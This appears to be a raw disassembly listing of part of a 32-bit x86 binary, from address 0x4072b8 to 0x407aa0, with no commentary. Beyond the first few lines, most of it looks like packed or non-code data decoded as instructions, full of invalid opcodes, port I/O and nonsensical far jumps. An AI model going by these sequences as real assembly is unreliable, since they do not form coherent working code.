  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x43476f
  4072cc:	mov    eax,ds:0x4347b3
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x82907a48
  4072fa:	leave  
  4072fb:	mov    DWORD PTR [edi+0x3f],esi
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x4072b3
  407306:	neg    DWORD PTR [esi+eiz*2]
  407309:	jg     0x4072ea
  40730b:	mov    eax,ds:0x268003c6
  407310:	mov    al,ds:0x8e7e3367
  407315:	mov    DWORD PTR [edx+0x64da463d],0x1d201f39
  40731f:	loop   0x40736c
  407321:	in     eax,dx
  407322:	ss and cl,bh
  407325:	adc    DWORD PTR [eax],ebx
  407327:	xchg   edx,eax
  407328:	in     eax,0x30
  40732a:	fsubr  st,st(5)
  40732c:	fidiv  DWORD PTR [esp+edi*8-0x6f]
  407330:	aad    0x48
  407332:	cmp    BYTE PTR [esi+0xb082b3e],cl
  407338:	ret    
  407339:	add    eax,eax
  40733b:	retf   
  40733c:	lods   eax,DWORD PTR ds:[esi]
  40733d:	mov    dl,0x73
  40733f:	mov    ?,WORD PTR [ebx-0x6ca0fac]
  407345:	adc    al,0x40
  407347:	mov    ch,BYTE PTR [edx-0x6a]
  40734a:	sub    DWORD PTR [ecx+0x697abe0d],ebx
  407350:	jo     0x4073bd
  407352:	aad    0x6e
  407354:	adc    DWORD PTR [esi],esi
  407356:	mov    ds:0xd3b36e0c,eax
  40735b:	dec    esi
  40735c:	xchg   esi,eax
  40735d:	jmp    0x4072e7
  40735f:	les    esp,FWORD PTR [eax-0x60]
  407362:	inc    edi
  407363:	cmp    DWORD PTR [ebp+0x36b73c40],0x74
  40736a:	sbb    al,0x4e
  40736d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40736e:	or     al,0xbc
  407370:	ins    BYTE PTR es:[edi],dx
  407371:	pcmpgtw mm6,mm3
  407374:	pop    esp
  407375:	pushf  
  407376:	rcr    BYTE PTR [ebx-0x775916b4],1
  40737c:	mov    esp,0x4a9231fa
  407381:	or     DWORD PTR [edi-0x6949cf9c],esp
  407387:	out    dx,eax
  407388:	sbb    bh,0x8e
  40738b:	jbe    0x407322
  40738d:	pop    ecx
  40738e:	scas   al,BYTE PTR es:[edi]
  40738f:	dec    ebx
  407390:	jnp    0x407384
  407392:	cmp    DWORD PTR [eax+0x49],edx
  407395:	pushf  
  407396:	in     eax,dx
  407397:	pop    esp
  407398:	sbb    edx,DWORD PTR [esi]
  40739a:	fcmovnu st,st(2)
  40739c:	add    ebx,0x43
  40739f:	mov    ah,0xa6
  4073a1:	clc    
  4073a2:	jbe    0x407416
  4073a4:	mov    DWORD PTR [edi],eax
  4073a6:	cmp    BYTE PTR [esi+0x7a],bh
  4073a9:	xchg   esp,eax
  4073aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ab:	lea    ebp,[esi-0x6e]
  4073ae:	jno    0x4073a7
  4073b0:	scas   eax,DWORD PTR es:[edi]
  4073b1:	pop    ds
  4073b2:	pop    eax
  4073b3:	jb     0x4073a3
  4073b5:	mov    al,ds:0x307522a3
  4073ba:	jae    0x4073c8
  4073bc:	cmp    ch,dl
  4073be:	aaa    
  4073bf:	cmp    al,0xfe
  4073c1:	cdq    
  4073c2:	nop
  4073c3:	mov    edi,0x7b04cc39
  4073c8:	adc    DWORD PTR [ecx-0x5addc158],ecx
  4073ce:	add    edx,edi
  4073d0:	clc    
  4073d1:	or     al,0x81
  4073d3:	mov    ah,0x1d
  4073d5:	loop   0x4073a3
  4073d7:	adc    dh,BYTE PTR [edx-0x650a3b20]
  4073dd:	sub    bl,al
  4073df:	dec    ebx
  4073e0:	sub    DWORD PTR [edi],0x97e8aef1
  4073e6:	aaa    
  4073e7:	inc    esp
  4073e8:	jmp    0xb1ca:0xb5e68d1
  4073ef:	mov    cl,dl
  4073f1:	mov    cl,0x33
  4073f3:	pop    ds
  4073f4:	mov    bl,0xef
  4073f6:	mov    dl,0xed
  4073f8:	(bad)  
  4073f9:	or     esi,ebx
  4073fb:	outs   dx,BYTE PTR ds:[esi]
  4073fc:	es jb  0x407427
  4073ff:	push   cs
  407400:	aas    
  407401:	or     dh,BYTE PTR [ebp-0x62]
  407404:	xor    DWORD PTR [ebp-0x3c],esi
  407407:	xchg   BYTE PTR [edi],cl
  407409:	sub    bp,WORD PTR [ebp+eiz*2+0x7d]
  40740e:	div    BYTE PTR [edi+ebx*1+0x2]
  407412:	shl    DWORD PTR [esi-0x44415250],cl
  407418:	ror    BYTE PTR [esi],0x17
  40741b:	test   BYTE PTR [esi+0x20debad4],ch
  407421:	lahf   
  407422:	pop    esi
  407423:	mov    DWORD PTR [ecx],ecx
  407425:	mov    ah,0x9c
  407427:	push   ebx
  407428:	inc    eax
  407429:	ins    BYTE PTR es:[edi],dx
  40742a:	cmp    esi,DWORD PTR [esi-0x46fae573]
  407430:	inc    ebp
  407431:	imul   ebx,ebp,0xfffffffc
  407434:	pop    eax
  407435:	pop    ds
  407436:	out    dx,al
  407437:	jo     0x4074a0
  407439:	lea    ebp,[ebp-0x5c]
  40743c:	in     al,dx
  40743d:	xchg   edx,eax
  40743e:	or     BYTE PTR [ebp+eax*8+0x4],0xf8
  407443:	aas    
  407444:	mov    WORD PTR [ecx],?
  407446:	in     al,0x7e
  407448:	jp     0x4073e0
  40744a:	mov    ecx,0x39a7ce31
  40744f:	jne    0x4074b1
  407451:	adc    DWORD PTR [edi],ebx
  407453:	push   ecx
  407454:	aaa    
  407455:	jnp    0x407421
  407457:	(bad)  
  407458:	cmp    DWORD PTR [ebx-0x20d50dc7],esi
  40745e:	aas    
  40745f:	(bad)  
  407460:	lea    eax,[eax+esi*8+0x55]
  407464:	adc    cl,BYTE PTR [edx]
  407466:	sbb    ecx,ecx
  407468:	cmc    
  407469:	loop   0x40743a
  40746b:	add    BYTE PTR [edx+0x5],0x61
  40746f:	(bad)  
  407470:	bnd jo 0x4074ef
  407473:	mov    edx,0xf1253d06
  407478:	ret    0xf732
  40747b:	not    cl
  40747d:	sbb    DWORD PTR [ebp-0x65],edx
  407480:	(bad)  
  407482:	cwde   
  407483:	les    eax,FWORD PTR [eax+0xf97228d]
  407489:	inc    ebp
  40748a:	not    cl
  40748c:	sbb    dh,dh
  40748e:	lahf   
  40748f:	jle    0x407467
  407491:	jl     0x4074ad
  407493:	ja     0x4074d0
  407495:	sub    al,0x24
  407497:	stos   BYTE PTR es:[edi],al
  407498:	cli    
  407499:	ja     0x4074e0
  40749b:	repnz jmp 0xbd70:0xd759bb6d
  4074a3:	mov    ah,bh
  4074a5:	inc    ecx
  4074a6:	call   0x74a3:0x5748a9a6
  4074ad:	js     0x40750f
  4074af:	xchg   edx,eax
  4074b0:	xchg   ebx,eax
  4074b1:	int    0xa0
  4074b3:	jbe    0x407487
  4074b5:	cld    
  4074b6:	add    eax,0x849e49fe
  4074bb:	cmc    
  4074bc:	in     al,dx
  4074bd:	neg    ch
  4074bf:	mov    ss,WORD PTR [eax+0x66]
  4074c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074c3:	xchg   ebx,eax
  4074c4:	pusha  
  4074c5:	cmp    bl,BYTE PTR [edi-0x3b5a21b8]
  4074cb:	in     al,0x9f
  4074cd:	ficomp DWORD PTR [ecx]
  4074cf:	retf   
  4074d0:	fdivr  QWORD PTR [edi]
  4074d2:	or     DWORD PTR [edi+ecx*4+0x852473b],ebx
  4074d9:	outs   dx,BYTE PTR ds:[esi]
  4074da:	rcl    BYTE PTR [ebp+0x7520ae2b],0xb4
  4074e1:	cmp    dh,al
  4074e3:	loop   0x4074fe
  4074e5:	(bad)  [edx-0x5af2cdb6]
  4074eb:	ins    BYTE PTR es:[edi],dx
  4074ec:	ret    0x2753
  4074ef:	sub    BYTE PTR [esi-0x7b3c6674],bh
  4074f5:	cmc    
  4074f6:	retf   
  4074f7:	and    ah,dh
  4074f9:	pop    ds
  4074fa:	out    dx,al
  4074fb:	add    al,0xf1
  4074fd:	fs dec esi
  4074ff:	push   0xffffffe1
  407501:	jnp    0x407506
  407503:	retf   0xa266
  407506:	ins    BYTE PTR es:[edi],dx
  407507:	mov    esi,0x62f9ced8
  40750c:	pop    edx
  40750d:	xlat   BYTE PTR ds:[ebx]
  40750e:	xor    ch,BYTE PTR [edx]
  407510:	mov    esi,0xb16ed986
  407515:	mov    dh,0xc1
  407517:	inc    ebx
  407518:	dec    esi
  407519:	test   dh,dh
  40751b:	and    ebp,eax
  40751d:	pop    esp
  40751e:	pop    edx
  40751f:	jbe    0x4074c1
  407521:	add    eax,0x9d801d04
  407526:	push   ecx
  407527:	sbb    eax,0x585fcd02
  40752c:	push   eax
  40752d:	data16 add dl,cl
  407530:	xchg   ebp,eax
  407531:	sub    esi,esi
  407533:	mov    dh,0x6b
  407535:	mov    BYTE PTR [ebx],ah
  407537:	test   DWORD PTR [esi+0x2a],ebx
  40753a:	xchg   DWORD PTR ds:0x2f347d87,edx
  407540:	enter  0xccdb,0xac
  407544:	add    eax,0xd1c1eeaa
  407549:	mov    al,0x3f
  40754b:	lock sub bl,BYTE PTR [ecx]
  40754e:	push   ss
  40754f:	pop    ds
  407550:	dec    edx
  407551:	pop    ebp
  407552:	test   al,0xee
  407554:	mov    ebx,0x6b08acf8
  407559:	pop    esp
  40755a:	idiv   DWORD PTR [edi+0x3f6b217]
  407560:	dec    ecx
  407561:	fcom   st(7)
  407563:	mov    eax,gs:0x7bfe6236
  407569:	ds lahf 
  40756b:	mov    bh,BYTE PTR [ebp+eax*4-0x724a1d9f]
  407572:	lea    ebp,[ebx+0x5e]
  407575:	std    
  407576:	aad    0x82
  407578:	daa    
  407579:	call   0xc5bc:0xdecf112c
  407580:	jmp    0x407580
  407582:	jns    0x407540
  407584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407585:	mov    al,0xa5
  407587:	cmc    
  407588:	outs   dx,BYTE PTR ds:[esi]
  407589:	(bad)  
  40758a:	stc    
  40758b:	inc    ebx
  40758c:	push   ebx
  40758d:	jae    0x40754d
  40758f:	call   DWORD PTR [edi-0x50986929]
  407595:	out    dx,eax
  407596:	jbe    0x407593
  407598:	push   ss
  407599:	sub    ch,BYTE PTR [ebx+0x4a2b5662]
  40759f:	adc    ebp,ebp
  4075a1:	pop    ebp
  4075a2:	rol    BYTE PTR [esi],cl
  4075a4:	xchg   esi,eax
  4075a5:	out    0x64,eax
  4075a7:	(bad)  
  4075a8:	outs   dx,BYTE PTR ds:[esi]
  4075a9:	inc    esp
  4075aa:	mul    DWORD PTR ds:0xd03bb127
  4075b0:	mov    cl,0x8d
  4075b2:	(bad)  
  4075b3:	cdq    
  4075b4:	sbb    eax,0x80b86c2
  4075b9:	pop    edx
  4075ba:	mov    cl,0xf8
  4075bc:	in     al,dx
  4075bd:	imul   edi,DWORD PTR [edi+edi*4-0x6d],0xffffffe0
  4075c2:	ror    BYTE PTR [edx-0x64c676fa],1
  4075c8:	mov    dh,BYTE PTR cs:[ecx+0x43186c3c]
  4075cf:	in     eax,0x44
  4075d1:	(bad)  
  4075d2:	stc    
  4075d3:	mov    ds:0xad7f18e2,al
  4075d8:	pop    ds
  4075d9:	adc    DWORD PTR [esi-0x544ef022],ebp
  4075df:	jbe    0x4075b4
  4075e1:	icebp  
  4075e2:	sub    al,0x35
  4075e4:	jne    0x407577
  4075e6:	adc    BYTE PTR [esi+edx*8+0x6239f2fb],al
  4075ed:	jmp    0x21bb2f4
  4075f2:	aas    
  4075f3:	xor    eax,0xaee0f185
  4075f8:	mov    eax,ds:0xd2ef54b3
  4075fd:	cli    
  4075fe:	mov    ah,0xca
  407600:	dec    edx
  407601:	xlat   BYTE PTR ds:[ebx]
  407602:	cli    
  407603:	fcmovnb st,st(6)
  407605:	xchg   ebp,eax
  407606:	mov    ecx,0x953b697
  40760b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40760c:	ds daa 
  40760e:	or     al,0xb3
  407610:	fisttp WORD PTR [esi-0x6f]
  407613:	dec    ebx
  407614:	xor    al,0xbd
  407616:	cmp    BYTE PTR [esi],cl
  407618:	std    
  407619:	and    al,0x62
  40761b:	pusha  
  40761c:	mov    dl,0xdd
  40761e:	sti    
  40761f:	cwde   
  407620:	xchg   edi,eax
  407621:	mov    ?,esp
  407623:	inc    esi
  407624:	jnp    0x4075ec
  407626:	imul   ecx,DWORD PTR [edx-0x654f909a],0xffffffc6
  40762d:	push   ds
  40762e:	popf   
  40762f:	push   0x6001f03a
  407634:	xlat   BYTE PTR ds:[ebx]
  407635:	add    DWORD PTR [esi],ebp
  407637:	clc    
  407638:	xor    eax,0xb41442e1
  40763d:	xlat   BYTE PTR ds:[ebx]
  40763e:	xor    eax,0x16711562
  407643:	stc    
  407644:	push   ebp
  407645:	adc    al,0x7f
  407647:	cmp    BYTE PTR [edi+0x51e37c4c],ah
  40764d:	(bad)  
  40764e:	sub    al,0x54
  407650:	push   es
  407651:	push   ebp
  407652:	cmp    bl,BYTE PTR [edi-0x3e8ee0db]
  407658:	shl    BYTE PTR [ebx],1
  40765a:	out    dx,eax
  40765b:	lods   eax,DWORD PTR ds:[esi]
  40765c:	sub    BYTE PTR [esi],al
  40765e:	jg     0x40762c
  407660:	cld    
  407661:	push   edx
  407662:	push   edx
  407663:	xor    ebx,DWORD PTR [esi]
  407665:	push   ds
  407666:	loopne 0x4076c2
  407668:	cmc    
  407669:	gs inc ecx
  40766b:	xor    DWORD PTR [eax-0x30],0x22
  40766f:	xor    DWORD PTR [ebp-0x7f],ebp
  407672:	cmp    ebp,DWORD PTR [ebp+0x5e8c2439]
  407678:	rcr    BYTE PTR [ebx-0x499444c3],1
  40767e:	cmp    ecx,DWORD PTR [edx]
  407680:	cmp    al,0xd1
  407682:	xor    eax,0xffffffa9
  407685:	adc    BYTE PTR [esi-0x7ada9a28],bh
  40768b:	mov    WORD PTR [edx+ebx*4+0x245df403],ss
  407692:	jmp    0xe9ee:0x1d7c7b49
  407699:	or     edx,ebx
  40769b:	imul   BYTE PTR [esi+edi*8-0x7110e8d]
  4076a2:	fnsave [edi+edx*1+0x76]
  4076a6:	add    eax,0x82f56ea
  4076ac:	mov    al,ds:0xe42a0d11
  4076b1:	repnz sub DWORD PTR [ecx],0x7f763f30
  4076b8:	xor    BYTE PTR ds:0x7428c375,al
  4076be:	pop    ebx
  4076bf:	sbb    dl,BYTE PTR [eax+0x32e96963]
  4076c5:	ds mov ah,0xdc
  4076c8:	sub    ebp,edx
  4076ca:	jge    0x407729
  4076cc:	pop    eax
  4076cd:	les    esp,FWORD PTR [ebx+0x1c98f9c4]
  4076d3:	push   esp
  4076d4:	pop    edx
  4076d5:	mov    esi,0x4c2c95b
  4076da:	add    BYTE PTR [ebx+0x4503f445],cl
  4076e0:	call   0xf494c122
  4076e5:	mov    DWORD PTR [edi],ecx
  4076e7:	test   BYTE PTR [esi],cl
  4076e9:	add    BYTE PTR [eax],al
  4076eb:	add    BYTE PTR [ebx+0x2081f045],cl
  4076f1:	sahf   
  4076f2:	sbb    al,0x75
  4076f4:	add    cl,ch
  4076f6:	in     eax,0xfb
  4076f8:	(bad)  
  4076f9:	dec    DWORD PTR [ebx+0x558bf445]
  4076ff:	call   0xbe7e390f
  407704:	das    
  407705:	(bad)  
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x7f66982f
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x4076b5
  40772b:	pop    ebp
  40772c:	xchg   DWORD PTR [ebp+0x3840f38a],esi
  407732:	xor    DWORD PTR [edi-0x1a],edx
  407735:	imul   edi,DWORD PTR [edi+0x501d4587],0x4a
  40773c:	xlat   BYTE PTR ds:[bx]
  40773e:	jbe    0x40770d
  407740:	or     eax,ebp
  407742:	in     al,0x8b
  407744:	jmp    0xfa3fb3e1
  407749:	shr    ch,0xde
  40774c:	jge    0x407771
  40774e:	or     DWORD PTR [eax],ecx
  407750:	mov    ah,0xd3
  407752:	mov    cl,0xe9
  407754:	jne    0x40773d
  407756:	lahf   
  407757:	xor    eax,0xf7a8c65d
  40775c:	dec    eax
  40775d:	mov    eax,ds:0x1c87ffcb
  407762:	xchg   ebx,eax
  407763:	adc    DWORD PTR [esi+0x7f],0xfffffff4
  407767:	xchg   esp,eax
  407768:	test   bh,dh
  40776a:	adc    esi,DWORD PTR [ecx-0x4d3f384c]
  407770:	ds mov ch,0x2d
  407773:	push   0x2f
  407775:	fcmovu st,st(1)
  407777:	jecxz  0x40773c
  407779:	cdq    
  40777a:	pop    ecx
  40777b:	shl    ecx,cl
  40777d:	inc    ecx
  40777e:	rcl    esi,0x3f
  407781:	pop    es
  407782:	jg     0x407768
  407784:	out    0xd,eax
  407786:	aad    0xd8
  407788:	or     ebx,DWORD PTR [ebp+0x5f]
  40778b:	pop    edx
  40778c:	pop    ebx
  40778e:	iret   
  40778f:	dec    esp
  407790:	sub    ch,BYTE PTR [edi-0x1b821ef7]
  407796:	call   edi
  407798:	daa    
  407799:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40779b:	mov    dl,0x5b
  40779d:	int    0x2
  40779f:	mov    al,ds:0xdd8db2c9
  4077a4:	xchg   ebx,eax
  4077a5:	jno    0x407795
  4077a7:	mov    al,ds:0xa9e83add
  4077ac:	lahf   
  4077ad:	jecxz  0x40777c
  4077af:	sub    al,0x5f
  4077b1:	jle    0x4077be
  4077b3:	cwde   
  4077b4:	cmp    esi,edx
  4077b6:	push   cs
  4077b7:	sbb    BYTE PTR [esi],dh
  4077b9:	arpl   WORD PTR [ebp-0x1d18f027],ax
  4077bf:	xor    DWORD PTR [eax-0x42],ebx
  4077c2:	in     eax,0x44
  4077c4:	or     al,0x13
  4077c6:	out    dx,al
  4077c7:	sbb    al,0xea
  4077c9:	shr    DWORD PTR [eax+0x36],cl
  4077cc:	lds    edx,FWORD PTR [edi+esi*1]
  4077cf:	push   ebx
  4077d0:	mul    BYTE PTR [edx+0x23aa4d1f]
  4077d6:	pusha  
  4077d7:	test   al,0x27
  4077d9:	out    0xc7,al
  4077db:	leave  
  4077dc:	cs push 0xffffffb6
  4077df:	popf   
  4077e0:	sbb    eax,0x29861254
  4077e5:	mov    ds:0x3c1bd99,al
  4077ea:	(bad)  
  4077eb:	fmul   DWORD PTR [ecx-0x33]
  4077ee:	inc    edi
  4077ef:	dec    ebx
  4077f0:	rcr    edi,1
  4077f2:	jecxz  0x407839
  4077f4:	mov    ebp,0x69ce492f
  4077f9:	int    0x2
  4077fb:	pop    esi
  4077fc:	test   BYTE PTR [edx],bl
  4077fe:	test   eax,0xafabd550
  407803:	daa    
  407804:	jb     0x4077f2
  407806:	cmp    al,0xda
  407808:	xor    eax,0xd4e12316
  40780d:	test   BYTE PTR [ecx+edx*2-0x7f],dh
  407811:	fwait
  407812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407813:	(bad)  
  407814:	inc    edi
  407815:	loop   0x407813
  407817:	sar    BYTE PTR [ebp-0x5a],cl
  40781a:	aad    0x6d
  40781c:	ficom  WORD PTR [edx+0x31]
  40781f:	test   esi,edx
  407821:	pop    eax
  407822:	arpl   WORD PTR [ebx],di
  407824:	daa    
  407825:	cs sbb eax,0xd678ccdb
  40782b:	outs   dx,DWORD PTR ds:[esi]
  40782c:	mov    ebp,0x9b6be0ff
  407831:	out    dx,al
  407832:	test   ecx,esi
  407834:	dec    eax
  407835:	outs   dx,BYTE PTR ds:[esi]
  407836:	loopne 0x4077d9
  407838:	inc    eax
  407839:	fcomi  st,st(3)
  40783b:	rcr    DWORD PTR [edx+ecx*2-0x6c35e5ad],cl
  407842:	mov    bl,0x45
  407844:	mov    edx,0xd6ffe1d7
  407849:	mov    ah,0x6e
  40784b:	push   ecx
  40784c:	mov    al,0x55
  40784e:	ror    DWORD PTR [ebp-0x12],1
  407851:	mov    esi,DWORD PTR ds:0x15f6efef
  407857:	or     al,al
  407859:	or     BYTE PTR [edx-0x8],bl
  40785c:	lods   eax,DWORD PTR ds:[esi]
  40785d:	mov    bl,0xb
  40785f:	inc    ecx
  407860:	adc    DWORD PTR [edi-0x3f],edi
  407863:	cmp    ah,BYTE PTR ss:[edi-0x379eadd4]
  40786a:	inc    esp
  40786b:	loop   0x40785d
  40786d:	cwde   
  40786e:	add    al,0xbc
  407870:	or     DWORD PTR [ecx+edx*1],0x6cf5cae7
  407877:	mov    edi,0x8c58efd0
  40787c:	ss pop ds
  40787e:	mov    ds:0x1618006d,eax
  407883:	retf   0x9cad
  407886:	mov    esi,0xe227583e
  40788b:	in     eax,0x92
  40788d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40788e:	pop    edi
  40788f:	mov    dl,0xb5
  407891:	test   DWORD PTR [ebx-0x60f34773],ebx
  407897:	sar    ebx,cl
  407899:	mov    BYTE PTR [edx+edi*4+0x46],cl
  40789d:	cmp    al,0xed
  40789f:	jmp    0xb72ea65f
  4078a4:	cmc    
  4078a5:	sbb    edi,DWORD PTR [edx]
  4078a7:	mov    bl,0x2c
  4078a9:	(bad)  
  4078aa:	add    al,0x3f
  4078ac:	aad    0xe1
  4078ae:	and    dl,dh
  4078b0:	(bad)  
  4078b1:	push   ebx
  4078b2:	inc    ecx
  4078b3:	mov    ds,ebp
  4078b5:	adc    al,0x6d
  4078b7:	int    0x7a
  4078b9:	mov    dh,0xf7
  4078bb:	or     eax,0xdb77ec5
  4078c0:	leave  
  4078c1:	and    DWORD PTR [esi],ecx
  4078c3:	xor    bl,bl
  4078c5:	pushf  
  4078c6:	hlt    
  4078c7:	aam    0x9c
  4078c9:	mov    ah,0xf6
  4078cb:	pop    ds
  4078cc:	aas    
  4078cd:	inc    ebp
  4078ce:	pop    esp
  4078cf:	push   0x7f9b7050
  4078d4:	hlt    
  4078d5:	cmc    
  4078d6:	mov    ebp,0x76775a2f
  4078db:	test   al,0x6f
  4078dd:	push   ss
  4078de:	aas    
  4078df:	icebp  
  4078e0:	push   edi
  4078e1:	inc    edx
  4078e2:	mov    WORD PTR [ecx],gs
  4078e4:	inc    eax
  4078e5:	arpl   WORD PTR [eax+0x6a],bp
  4078e8:	or     eax,0xbe8fa10c
  4078ed:	test   al,0x11
  4078ef:	leave  
  4078f0:	int3   
  4078f1:	fs push ds
  4078f3:	jg     0x4078a6
  4078f5:	xor    esp,DWORD PTR [esi]
  4078f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078f8:	fcomp  DWORD PTR [ebp+0x3a]
  4078fb:	pusha  
  4078fc:	sbb    cl,cl
  4078fe:	out    0x72,al
  407900:	mov    esp,0xc3651367
  407905:	das    
  407906:	popa   
  407907:	xor    edi,DWORD PTR [esi]
  407909:	inc    esp
  40790a:	push   eax
  40790b:	stos   BYTE PTR es:[edi],al
  40790c:	int    0xf4
  40790e:	xor    DWORD PTR [edx+0x22886ebc],edi
  407914:	cmc    
  407915:	jl     0x407900
  407917:	fwait
  407918:	daa    
  407919:	mov    edi,0x2d333ff
  40791e:	pusha  
  40791f:	sbb    DWORD PTR [ecx+0x684da703],ebp
  407925:	inc    esp
  407926:	das    
  407927:	xor    eax,0x894ee349
  40792c:	mov    cl,BYTE PTR [ebx+0x6b875b0c]
  407932:	jnp    0x4078e6
  407934:	ins    BYTE PTR es:[edi],dx
  407935:	adc    al,0xf2
  407937:	sub    al,0x7a
  407939:	(bad)  
  40793a:	imul   eax,DWORD PTR [edx],0x55
  40793d:	cld    
  40793e:	pushf  
  40793f:	inc    esi
  407940:	mov    eax,0xfcc0a589
  407945:	or     eax,0x9a479254
  40794a:	cmp    DWORD PTR [edx-0x2f6b9173],ebx
  407950:	test   eax,0x5cb6f22a
  407955:	jne    0x4078db
  407957:	arpl   WORD PTR [ecx],cx
  407959:	cmp    dl,BYTE PTR ds:0xe0f07acf
  40795f:	or     ebx,DWORD PTR [ebp+0x11e38f98]
  407965:	pop    ebx
  407966:	ins    BYTE PTR es:[edi],dx
  407967:	and    esi,edi
  407969:	aas    
  40796a:	loopne 0x407914
  40796c:	into   
  40796d:	mov    ds:0x9ac8acef,al
  407972:	xor    DWORD PTR [ecx-0x10],edi
  407975:	sub    BYTE PTR [ecx],dh
  407977:	jae    0x407962
  407979:	arpl   WORD PTR [ecx],bp
  40797b:	das    
  40797c:	mov    ebx,0xb7f49a51
  407981:	js     0x4079d0
  407983:	dec    edx
  407984:	shl    DWORD PTR [ebx+0x53],0x74
  407988:	push   0x6af24f01
  40798d:	enter  0xe6cf,0x29
  407991:	xor    al,0xd8
  407993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407994:	xor    ebp,DWORD PTR [eax+0x1468aba3]
  40799a:	pop    edx
  40799b:	repz sbb esp,DWORD PTR [ebx-0xf]
  40799f:	jge    0x407990
  4079a1:	sub    BYTE PTR ss:[edi-0x69],bh
  4079a5:	and    al,0xab
  4079a7:	pop    ds
  4079a8:	mov    ebx,0x2b432489
  4079ad:	and    ebx,DWORD PTR [edx]
  4079af:	adc    ecx,esp
  4079b1:	lahf   
  4079b2:	add    BYTE PTR [edi+0xd2916f1],ah
  4079b8:	test   al,0x5a
  4079ba:	clc    
  4079bb:	xchg   edx,eax
  4079bc:	dec    ebp
  4079bd:	push   ss
  4079be:	lahf   
  4079bf:	xor    ah,BYTE PTR [edi+0x6e]
  4079c2:	enter  0x1142,0x6c
  4079c6:	adc    ebx,eax
  4079c8:	lods   al,BYTE PTR ds:[esi]
  4079c9:	inc    BYTE PTR [ebp+0x60cb78dc]
  4079cf:	inc    edx
  4079d0:	xlat   BYTE PTR ds:[ebx]
  4079d1:	lods   eax,DWORD PTR ds:[esi]
  4079d2:	push   0xffffffef
  4079d4:	(bad)  
  4079d7:	mov    ecx,ds
  4079d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079da:	ss shr eax,cl
  4079dd:	adc    al,0xca
  4079df:	mov    ?,WORD PTR [ebx+0x36]
  4079e2:	adc    esp,DWORD PTR [ebx+0x7aa8685b]
  4079e8:	test   al,0x6a
  4079ea:	cmp    esi,DWORD PTR [ecx]
  4079ec:	aas    
  4079ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ee:	iret   
  4079ef:	push   0x51fc04a9
  4079f4:	fisubr WORD PTR [esi+eiz*8-0x3f9933f8]
  4079fb:	aam    0xcb
  4079fd:	mov    esp,0x1023b37
  407a02:	jo     0x407a1a
  407a04:	xor    al,0x83
  407a06:	jo     0x407a52
  407a08:	lds    ebp,FWORD PTR [ebp+0x4c]
  407a0b:	lods   al,BYTE PTR ds:[esi]
  407a0c:	push   0x25
  407a0e:	or     eax,0xf3649311
  407a13:	adc    al,0x1a
  407a15:	push   ebx
  407a16:	out    0xc8,eax
  407a18:	faddp  st(6),st
  407a1a:	mov    esi,0xe3fa8e8b
  407a1f:	inc    ecx
  407a20:	push   esi
  407a21:	mov    esp,0xfc7c28c7
  407a26:	psllq  mm7,mm2
  407a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a2a:	in     al,0x76
  407a2c:	stc    
  407a2d:	in     eax,dx
  407a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a2f:	enter  0xe73e,0xdb
  407a33:	fucom  st(4)
  407a35:	and    DWORD PTR [ecx+ecx*4+0x68],eax
  407a39:	pop    es
  407a3a:	arpl   WORD PTR ss:[ebx+0x7e687fb4],cx
  407a41:	xor    BYTE PTR [eax],0x6
  407a44:	loopne 0x407a5c
  407a46:	les    edi,FWORD PTR [ecx+edi*1+0x7b4bba11]
  407a4d:	std    
  407a4e:	add    esi,0xa972aa45
  407a54:	sbb    BYTE PTR [esi*1+0x6d2e19e8],dh
  407a5b:	mov    eax,DWORD PTR [esi]
  407a5d:	hlt    
  407a5e:	sbb    bl,BYTE PTR [ebp+0x62e76b9d]
  407a64:	in     al,0x15
  407a66:	sub    al,0x38
  407a68:	lods   al,BYTE PTR ds:[esi]
  407a69:	add    al,BYTE PTR [ebp-0x1a]
  407a6c:	test   eax,0x15a12de6
  407a71:	pop    esp
  407a72:	mov    al,0x69
  407a74:	call   0xc5a2d713
  407a79:	push   esp
  407a7a:	popa   
  407a7b:	imul   edx,DWORD PTR [edi+ecx*4],0xb5094359
  407a82:	enter  0xdb03,0x41
  407a86:	lahf   
  407a87:	jae    0x407a83
  407a89:	(bad)  
  407a8a:	aaa    
  407a8b:	loop   0x407a4c
  407a8d:	xor    esi,ebp
  407a8f:	xchg   edi,eax
  407a90:	dec    edx
  407a91:	(bad)  
  407a92:	cmc    
  407a93:	imul   ecx,DWORD PTR [eax-0x343abf85],0xae1a0990
  407a9d:	(bad)  
  407a9e:	adc    al,0x89
  407aa0:	push   esp
